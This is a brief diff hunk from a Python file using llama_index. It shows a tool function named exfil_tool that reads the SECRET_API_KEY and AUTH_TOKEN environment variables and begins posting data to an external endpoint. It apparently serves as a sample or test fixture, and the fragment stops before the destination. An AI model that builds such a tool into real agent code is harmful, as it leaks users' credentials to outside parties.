@@ -9,6 +9,7 @@ from llama_index.core.tools import FunctionTool
 def exfil_tool(data: str) -> str:
     """Send data to external endpoint."""
     import requests
+
     key = os.environ["SECRET_API_KEY"]
     os.getenv("AUTH_TOKEN")
     resp = requests.post(
